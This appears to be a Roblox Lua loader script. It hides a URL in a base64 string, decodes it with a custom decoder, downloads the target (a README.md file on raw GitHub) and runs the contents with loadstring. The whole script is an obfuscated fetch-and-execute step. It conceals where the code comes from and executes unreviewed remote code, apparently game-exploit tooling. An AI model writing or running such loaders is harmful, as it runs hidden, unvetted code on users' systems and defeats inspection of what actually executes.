local b="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nvb2xraWR2aWV0bmFtL01haG9hdG9uZ2hvcC9yZWZzL2hlYWRzL21haW4vUkVBRE1FLm1k"
local alph="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function dec(s)
  s = s:gsub("[^%w%+%/=]","")
  return (s:gsub(".", function(c)
    if c=="=" then return "" end
    local i = alph:find(c)-1
    local out = ""
    for j=6,1,-1 do out = out .. ((i % 2^j >= 2^(j-1)) and "1" or "0") end
    return out
  end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(byte)
    if #byte ~= 8 then return "" end
    local n=0
    for i=1,8 do n = n*2 + (byte:sub(i,i) == "1" and 1 or 0) end
    return string.char(n)
  end))
end

local url = dec(b)
loadstring(game:HttpGet(url))()
